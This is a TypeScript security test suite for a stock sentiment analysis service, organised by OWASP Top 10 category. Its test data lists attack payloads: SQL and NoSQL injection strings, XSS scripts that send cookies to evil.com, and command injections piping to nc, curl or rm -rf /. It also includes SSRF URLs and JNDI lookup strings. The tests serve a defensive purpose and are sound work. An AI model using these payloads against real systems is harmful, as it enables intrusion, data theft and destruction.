/**
 * Security Test Suite for SentimentAnalysisService
 * Tests OWASP Top 10 compliance and enterprise-grade security validation
 * Follows VFR testing standards with NO MOCK DATA - tests real security implementations
 */

import { SentimentAnalysisService } from '../SentimentAnalysisService'
import NewsAPI from '../providers/NewsAPI'
import { RedisCache } from '../../cache/RedisCache'
import { SecurityValidator } from '../../security/SecurityValidator'

describe('SentimentAnalysisService Security Tests', () => {
  let sentimentService: SentimentAnalysisService
  let newsAPI: NewsAPI
  let cache: RedisCache
  let securityValidator: SecurityValidator

  // Test constants
  const TEST_TIMEOUTS = {
    SHORT: 10000,
    MEDIUM: 20000,
    LONG: 30000,
    BULK: 45000,
    LOAD: 90000
  }

  // Common malicious input patterns
  const MALICIOUS_INPUTS = {
    PATH_TRAVERSAL: ['../admin/sentiment', '../../user/data', '/root/secrets', '../../../etc/passwd'],
    SQL_INJECTION: ["'; DROP TABLE sentiment_data; --", "' UNION SELECT api_key FROM config; --", "'; DELETE FROM cache WHERE 1=1; --", "'; INSERT INTO malicious_table VALUES ('hacked'); --", "' OR '1'='1", "'; EXEC xp_cmdshell('format c:'); --", "admin'--", "'; SELECT password FROM users WHERE ''=''"],
    XSS_ATTACKS: ['<script>alert("XSS")</script>', '<img src=x onerror=alert(document.cookie)>', '<iframe src="javascript:alert(1)"></iframe>', '"><script>fetch("http://evil.com/steal?data="+document.cookie)</script>', '<svg onload=alert("XSS")>', 'javascript:alert("XSS")', '<body onload=alert("XSS")>', '<meta http-equiv="refresh" content="0;url=http://evil.com">', '<script>document.location="http://evil.com/"+document.cookie</script>'],
    COMMAND_INJECTION: ['AAPL; cat /etc/passwd', 'AAPL && rm -rf /', 'AAPL | nc evil.com 1234', 'AAPL $(whoami)', 'AAPL `id`', 'AAPL; curl http://evil.com/steal', 'AAPL & powershell -c "malicious command"', 'AAPL; ping evil.com', 'AAPL`ls -la`', 'AAPL$(cat /etc/shadow)'],
    SSRF_ATTEMPTS: ['http://localhost:22', 'https://169.254.169.254/metadata', 'file:///etc/passwd', 'ftp://internal.company.com', 'gopher://127.0.0.1:25', 'http://10.0.0.1/admin', 'https://127.0.0.1:8080/admin']
  }

  // Console capture utility
  const captureConsoleOutput = () => {
    const originalConsole = {
      error: console.error,
      log: console.log,
      warn: console.warn
    }
    const capturedLogs: string[] = []

    console.error = (...args: any[]) => capturedLogs.push(args.join(' '))
    console.log = (...args: any[]) => capturedLogs.push(args.join(' '))
    console.warn = (...args: any[]) => capturedLogs.push(args.join(' '))

    return {
      restore: () => {
        console.error = originalConsole.error
        console.log = originalConsole.log
        console.warn = originalConsole.warn
      },
      getLogs: () => capturedLogs.join(' ')
    }
  }

  // Security validation helper
  const validateSecurityResponse = (data: any) => {
    if (data) {
      const dataString = JSON.stringify(data)
      expect(dataString).not.toContain('api_key')
      expect(dataString).not.toContain('secret')
      expect(dataString).not.toContain('password')
      expect(dataString).not.toContain('token')
    }
  }

  beforeEach(() => {
    // Get security validator instance and reset state
    securityValidator = SecurityValidator.getInstance()
    try {
      securityValidator.resetSecurityState()
    } catch (error) {
      // Continue if reset fails - validator may not support reset in all environments
    }

    // Create fresh instances with real configurations
    newsAPI = new NewsAPI(process.env.NEWSAPI_KEY, 15000, false)
    cache = new RedisCache()
    sentimentService = new SentimentAnalysisService(newsAPI, cache)
  })

  afterEach(() => {
    try {
      securityValidator.resetSecurityState()
    } catch (error) {
      // Continue if reset fails
    }
  })

  describe('OWASP A01: Broken Access Control', () => {
    test('should prevent unauthorized access to sentiment analysis', async () => {
      // Test with various unauthorized access attempts
      for (const maliciousSymbol of MALICIOUS_INPUTS.PATH_TRAVERSAL) {
        const result = await sentimentService.analyzeStockSentimentImpact(
          maliciousSymbol,
          'Technology',
          0.75
        )

        // Should reject unauthorized access attempts
        expect(result).toBeNull()
      }
    })

    test('should enforce proper access control for bulk analysis', async () => {
      const maliciousStocks = [
        { symbol: '../admin', sector: 'Technology', baseScore: 0.5 },
        { symbol: '../../config', sector: 'Finance', baseScore: 0.6 },
        { symbol: '/etc/hosts', sector: 'Tech', baseScore: 0.7 }
      ]

      const result = await sentimentService.analyzeBulkSentimentImpact(maliciousStocks)

      // Should complete without security breaches
      expect(result.success).toBe(true)
      expect(result.data?.stockImpacts).toEqual([])
    })
  })

  describe('OWASP A02: Cryptographic Failures', () => {
    test('should not expose api keys in error messages', async () => {
      const consoleCapture = captureConsoleOutput()

      try {
        // Force error conditions to check API key exposure
        const errorNewsAPI = new NewsAPI('invalid_api_key_format', 1, false)
        const errorService = new SentimentAnalysisService(errorNewsAPI, cache)

        await errorService.analyzeStockSentimentImpact('AAPL', 'Technology', 0.75)

        // Check all logs for API key exposure
        const allLogs = consoleCapture.getLogs()
        expect(allLogs).not.toContain('invalid_api_key_format')
        expect(allLogs).not.toMatch(/[a-f0-9]{32}/) // NewsAPI key pattern
        expect(allLogs).not.toContain('api_key')
        expect(allLogs).not.toContain('secret')
        expect(allLogs).not.toContain('token')
      } finally {
        consoleCapture.restore()
      }
    })

    test('should sanitize cache data for security', async () => {
      const testSymbol = 'AAPL'

      // Perform sentiment analysis to populate cache
      await sentimentService.analyzeStockSentimentImpact(testSymbol, 'Technology', 0.75)

      // Check that cache doesn't contain sensitive information
      const cacheKey = `sentiment:indicators:${testSymbol}`
      const cachedData = await cache.get(cacheKey)

      validateSecurityResponse(cachedData)
    })
  })

  describe('OWASP A03: Injection Attacks', () => {
    test('should prevent sql injection in symbol parameter', async () => {
      for (const maliciousSymbol of MALICIOUS_INPUTS.SQL_INJECTION) {
        const result = await sentimentService.analyzeStockSentimentImpact(
          maliciousSymbol,
          'Technology',
          0.75
        )

        // Should handle SQL injection attempts safely
        expect(result).toBeNull()
      }
    })

    test('should prevent nosql injection in parameters', async () => {
      const nosqlInjectionAttempts = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$where": "function() { return true; }"}',
        '{"$regex": ".*"}',
        '{"$exists": true}',
        '{"__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}'
      ]

      for (const maliciousSymbol of nosqlInjectionAttempts) {
        const indicators = await sentimentService.getSentimentIndicators(maliciousSymbol)
        expect(indicators).toBeNull()
      }
    })

    test('should prevent xss attacks in symbol input', async () => {
      for (const xssPayload of MALICIOUS_INPUTS.XSS_ATTACKS) {
        const result = await sentimentService.analyzeStockSentimentImpact(
          xssPayload,
          'Technology',
          0.75
        )

        expect(result).toBeNull()

        // Test bulk analysis as well
        const bulkResult = await sentimentService.analyzeBulkSentimentImpact([
          { symbol: xssPayload, sector: 'Technology', baseScore: 0.5 }
        ])

        expect(bulkResult.success).toBe(true)
        expect(bulkResult.data?.stockImpacts).toEqual([])
      }
    })

    test('should prevent command injection attempts', async () => {
      for (const commandInjection of MALICIOUS_INPUTS.COMMAND_INJECTION) {
        const result = await sentimentService.analyzeStockSentimentImpact(
          commandInjection,
          'Technology',
          0.75
        )

        // Should handle command injection safely
        expect(result).toBeNull()
      }
    })
  })

  describe('OWASP A04: Insecure Design', () => {
    test('should implement proper rate limiting for sentiment analysis', async () => {
      const testSymbol = 'AAPL'

      // Test sequential requests with timing
      const startTime = Date.now()
      const promises = Array(5).fill(0).map(() =>
        sentimentService.analyzeStockSentimentImpact(testSymbol, 'Technology', 0.75)
      )

      await Promise.allSettled(promises)
      const totalTime = Date.now() - startTime

      // Should have some rate limiting delay
      expect(totalTime).toBeGreaterThan(100)
    }, TEST_TIMEOUTS.LONG)

    test('should validate input parameters comprehensively', async () => {
      const invalidInputs = [
        { symbol: null, sector: 'Technology', baseScore: 0.75 },
        { symbol: undefined, sector: 'Technology', baseScore: 0.75 },
        { symbol: '', sector: 'Technology', baseScore: 0.75 },
        { symbol: 'AAPL', sector: null, baseScore: 0.75 },
        { symbol: 'AAPL', sector: 'Technology', baseScore: null },
        { symbol: 'AAPL', sector: 'Technology', baseScore: 'invalid' },
        { symbol: 'AAPL', sector: 'Technology', baseScore: -1 },
        { symbol: 'AAPL', sector: 'Technology', baseScore: 2 }
      ]

      for (const invalidInput of invalidInputs) {
        const result = await sentimentService.analyzeStockSentimentImpact(
          invalidInput.symbol as any,
          invalidInput.sector as any,
          invalidInput.baseScore as any
        )

        // Should handle invalid inputs gracefully
        expect(result === null || typeof result === 'object').toBe(true)
      }
    })

    test('should implement secure caching strategy', async () => {
      const testSymbol = 'MSFT'

      // First request should populate cache
      const firstResult = await sentimentService.analyzeStockSentimentImpact(
        testSymbol,
        'Technology',
        0.75
      )

      // Second request should use cache but not expose sensitive data
      const secondResult = await sentimentService.analyzeStockSentimentImpact(
        testSymbol,
        'Technology',
        0.75
      )

      // Check that cached data doesn't leak sensitive information
      validateSecurityResponse(firstResult)
      validateSecurityResponse(secondResult)

      if (secondResult) {
        const resultString = JSON.stringify(secondResult)
        expect(resultString).not.toContain('internal_')
      }
    })
  })

  describe('OWASP A05: Security Misconfiguration', () => {
    test('should not expose internal configuration details', async () => {
      const testSymbol = 'GOOGL'

      const result = await sentimentService.analyzeStockSentimentImpact(
        testSymbol,
        'Technology',
        0.75
      )

      if (result) {
        const resultString = JSON.stringify(result)
        expect(resultString).not.toContain('newsAPI')
        expect(resultString).not.toContain('cache')
        expect(resultString).not.toContain('config')
        expect(resultString).not.toContain('internal')
        expect(resultString).not.toContain('private')
      }
    })

    test('should handle service health checks securely', async () => {
      const healthCheck = await sentimentService.healthCheck()

      expect(healthCheck).toHaveProperty('status')
      expect(['healthy', 'unhealthy']).toContain(healthCheck.status)

      // Health check response should not expose sensitive details
      validateSecurityResponse(healthCheck)
    })

    test('should enforce proper error handling configuration', async () => {
      // Test with non-existent symbol to trigger error paths
      const result = await sentimentService.analyzeStockSentimentImpact(
        'NONEXISTENT',
        'Technology',
        0.75
      )

      // Should fail gracefully without exposing configuration
      expect(result).toBeNull()
    })
  })

  describe('OWASP A06: Vulnerable and Outdated Components', () => {
    test('should use secure communication with newsapi', async () => {
      const testSymbol = 'AMZN'

      // Verify that NewsAPI communication is secure
      const result = await sentimentService.analyzeStockSentimentImpact(
        testSymbol,
        'Technology',
        0.75
      )

      // Should complete without security issues (HTTPS enforced by NewsAPI)
      expect(result === null || typeof result === 'object').toBe(true)
    }, TEST_TIMEOUTS.MEDIUM)

    test('should validate external api responses for security', async () => {
      const testSymbol = 'TSLA'

      const indicators = await sentimentService.getSentimentIndicators(testSymbol)

      if (indicators) {
        // Check that response data doesn't contain malicious properties using hasOwnProperty
        expect(indicators.hasOwnProperty('__proto__')).toBe(false)
        expect(indicators.hasOwnProperty('constructor')).toBe(false)
        expect(indicators.hasOwnProperty('prototype')).toBe(false)
        expect(indicators.hasOwnProperty('eval')).toBe(false)
        expect(indicators.hasOwnProperty('function')).toBe(false)

        // Validate news data structure
        expect(indicators.news).toHaveProperty('symbol')
        expect(typeof indicators.news.sentiment).toBe('number')
        expect(typeof indicators.news.confidence).toBe('number')

        // Additional prototype pollution checks
        expect(Object.getPrototypeOf(indicators)).toBe(Object.prototype)
        expect(JSON.stringify(indicators)).not.toContain('__proto__')
      }
    }, TEST_TIMEOUTS.LONG)
  })

  describe('OWASP A07: Identification and Authentication Failures', () => {
    test('should not expose authentication tokens in responses', async () => {
      const testSymbol = 'META'

      const result = await sentimentService.analyzeStockSentimentImpact(
        testSymbol,
        'Technology',
        0.75
      )

      if (result) {
        const resultString = JSON.stringify(result)
        expect(resultString).not.toContain('jwt')
        expect(resultString).not.toContain('bearer')
        expect(resultString).not.toContain('auth')
        expect(resultString).not.toContain('session')
        expect(resultString).not.toContain('cookie')
      }
    })

    test('should handle authentication failures securely', async () => {
      // Create service with invalid authentication
      const invalidNewsAPI = new NewsAPI('', 15000, false)
      const invalidService = new SentimentAnalysisService(invalidNewsAPI, cache)

      const result = await invalidService.analyzeStockSentimentImpact(
        'AAPL',
        'Technology',
        0.75
      )

      // Service should handle auth failures gracefully - may return degraded response or null
      // The service can still work with Reddit data even if NewsAPI fails
      expect(result === null || typeof result === 'object').toBe(true)

      // If result exists, validate it doesn't expose auth details
      if (result) {
        validateSecurityResponse(result)
      }
    })
  })

  describe('OWASP A08: Software and Data Integrity Failures', () => {
    test('should validate sentiment data integrity', async () => {
      const testSymbol = 'NFLX'

      const result = await sentimentService.analyzeStockSentimentImpact(
        testSymbol,
        'Technology',
        0.75
      )

      if (result) {
        // Validate data integrity
        expect(result.sentimentScore.overall).toBeGreaterThanOrEqual(0)
        expect(result.sentimentScore.overall).toBeLessThanOrEqual(1)
        expect(result.sentimentScore.confidence).toBeGreaterThanOrEqual(0)
        expect(result.sentimentScore.confidence).toBeLessThanOrEqual(1)
        expect(result.adjustedScore).toBeGreaterThanOrEqual(0)
        expect(result.adjustedScore).toBeLessThanOrEqual(1)
        expect(result.sentimentWeight).toBe(0.10) // Should be exactly 10%
        expect(Array.isArray(result.insights)).toBe(true)
      }
    }, TEST_TIMEOUTS.LONG)

    test('should prevent data tampering in bulk analysis', async () => {
      const testStocks = [
        { symbol: 'AAPL', sector: 'Technology', baseScore: 0.75 },
        { symbol: 'MSFT', sector: 'Technology', baseScore: 0.80 },
        { symbol: 'GOOGL', sector: 'Technology', baseScore: 0.70 }
      ]

      const result = await sentimentService.analyzeBulkSentimentImpact(testStocks)

      if (result.success && result.data) {
        // Validate bulk data integrity
        expect(Array.isArray(result.data.stockImpacts)).toBe(true)

        result.data.stockImpacts.forEach(impact => {
          expect(impact.sentimentWeight).toBe(0.10)
          expect(impact.adjustedScore).toBeGreaterThanOrEqual(0)
          expect(impact.adjustedScore).toBeLessThanOrEqual(1)
        })
      }
    }, TEST_TIMEOUTS.BULK)
  })

  describe('OWASP A09: Security Logging and Monitoring Failures', () => {
    test('should implement secure logging practices', async () => {
      const consoleCapture = captureConsoleOutput()

      try {
        await sentimentService.analyzeStockSentimentImpact('AAPL', 'Technology', 0.75)

        // Check that logs don't contain sensitive information
        const allLogs = consoleCapture.getLogs()
        expect(allLogs).not.toMatch(/[a-f0-9]{32}/) // API keys
        expect(allLogs).not.toContain('secret')
        expect(allLogs).not.toContain('password')
        expect(allLogs).not.toContain('token')
      } finally {
        consoleCapture.restore()
      }
    })

    test('should monitor suspicious activity patterns', async () => {
      const suspiciousSymbols = [
        '<script>alert(1)</script>',
        '../../../etc/passwd',
        '; DROP TABLE users; --',
        '${jndi:ldap://evil.com/a}'
      ]

      // Test multiple suspicious requests
      for (const suspiciousSymbol of suspiciousSymbols) {
        await sentimentService.analyzeStockSentimentImpact(
          suspiciousSymbol,
          'Technology',
          0.75
        )
      }

      // Security monitoring should handle these gracefully
      const securityStatus = securityValidator.getSecurityStatus()
      expect(typeof securityStatus).toBe('object')
    })
  })

  describe('OWASP A10: Server-Side Request Forgery (SSRF)', () => {
    test('should prevent ssrf attacks through symbol parameter', async () => {
      for (const ssrfAttempt of MALICIOUS_INPUTS.SSRF_ATTEMPTS) {
        const result = await sentimentService.analyzeStockSentimentImpact(
          ssrfAttempt,
          'Technology',
          0.75
        )

        // Should reject SSRF attempts
        expect(result).toBeNull()
      }
    })

    test('should validate url schemes in newsapi integration', async () => {
      // Test legitimate symbol to verify normal operation
      const legitimateResult = await sentimentService.analyzeStockSentimentImpact(
        'AAPL',
        'Technology',
        0.75
      )

      // Should work with legitimate symbols (or return null if no news)
      expect(legitimateResult === null || typeof legitimateResult === 'object').toBe(true)
    }, TEST_TIMEOUTS.MEDIUM)
  })

  describe('Real-World Attack Scenarios', () => {
    test('should handle combined attack vectors', async () => {
      const combinedAttacks = [
        '<script>fetch("http://evil.com/"+document.cookie)</script>',
        '\'; DROP TABLE users; --<img src=x onerror=alert(1)>',
        '../../../etc/passwd?param=<script>alert(1)</script>',
        '${jndi:ldap://evil.com/a}"; DELETE FROM cache; --'
      ]

      for (const combinedAttack of combinedAttacks) {
        const result = await sentimentService.analyzeStockSentimentImpact(
          combinedAttack,
          'Technology',
          0.75
        )

        expect(result).toBeNull()
      }
    })

    test('should maintain security under high concurrent load', async () => {
      const symbols = ['AAPL', 'MSFT', 'GOOGL', 'AMZN', 'TSLA']
      const maliciousInputs = [
        '<script>alert(1)</script>',
        '; DROP TABLE users; --',
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}'
      ]

      // Mix legitimate and malicious requests
      const allRequests = [
        ...symbols.map(symbol =>
          sentimentService.analyzeStockSentimentImpact(symbol, 'Technology', 0.75)
        ),
        ...maliciousInputs.map(input =>
          sentimentService.analyzeStockSentimentImpact(input, 'Technology', 0.75)
        )
      ]

      const results = await Promise.allSettled(allRequests)

      // All requests should complete without throwing errors
      results.forEach(result => {
        expect(['fulfilled', 'rejected']).toContain(result.status)
      })

      // Security state should remain stable
      const securityStatus = securityValidator.getSecurityStatus()
      expect(typeof securityStatus).toBe('object')
    }, TEST_TIMEOUTS.LOAD)

    test('should validate legitimate stock symbols correctly', async () => {
      const legitimateSymbols = [
        'aapl',      // lowercase
        'AAPL ',     // with trailing space
        ' MSFT',     // with leading space
        'GOOGL\t',   // with tab
        'AMZN\n',    // with newline
        'TSLA\r',    // with carriage return
        '  META  '   // with multiple spaces
      ]

      for (const symbol of legitimateSymbols) {
        // These should be sanitized and processed, not rejected
        const result = await sentimentService.analyzeStockSentimentImpact(
          symbol,
          'Technology',
          0.75
        )

        // Should either return data or null (not throw errors)
        expect(result === null || typeof result === 'object').toBe(true)
      }
    })

    test('should handle edge case inputs securely', async () => {
      const edgeCases = [
        '',           // empty string
        ' ',          // space only
        '\t',         // tab only
        '\n',         // newline only
        '\r',         // carriage return only
        '\0',         // null byte
        'A'.repeat(1000), // very long string
        '🚀📈💰',      // emojis
        'AAPL\x00',   // null byte injection
        'AAPL\uFEFF'  // BOM character
      ]

      for (const edgeCase of edgeCases) {
        const result = await sentimentService.analyzeStockSentimentImpact(
          edgeCase,
          'Technology',
          0.75
        )

        // Should handle edge cases gracefully
        expect(result === null || typeof result === 'object').toBe(true)
      }
    })
  })

  describe('Error Message Security', () => {
    test('should sanitize error messages for production security', async () => {
      const originalNodeEnv = process.env.NODE_ENV
      Object.defineProperty(process.env, 'NODE_ENV', {
        value: 'production',
        configurable: true
      })

      try {
        // Force error with invalid API configuration
        const errorNewsAPI = new NewsAPI('', 1, false)
        const errorService = new SentimentAnalysisService(errorNewsAPI, cache)

        // Capture error output
        const consoleCapture = captureConsoleOutput()

        try {
          await errorService.analyzeStockSentimentImpact('AAPL', 'Technology', 0.75)

          // Check error message sanitization
          const allErrors = consoleCapture.getLogs()
          expect(allErrors).not.toContain('api_key')
          expect(allErrors).not.toContain('secret')
          expect(allErrors).not.toContain('password')
          expect(allErrors).not.toContain('database')
          expect(allErrors).not.toContain('mongodb://')
        } finally {
          consoleCapture.restore()
        }
      } finally {
        if (originalNodeEnv !== undefined) {
          Object.defineProperty(process.env, 'NODE_ENV', {
            value: originalNodeEnv,
            configurable: true
          })
        } else {
          Object.defineProperty(process.env, 'NODE_ENV', {
            value: undefined,
            configurable: true
          })
        }
      }
    })
  })
})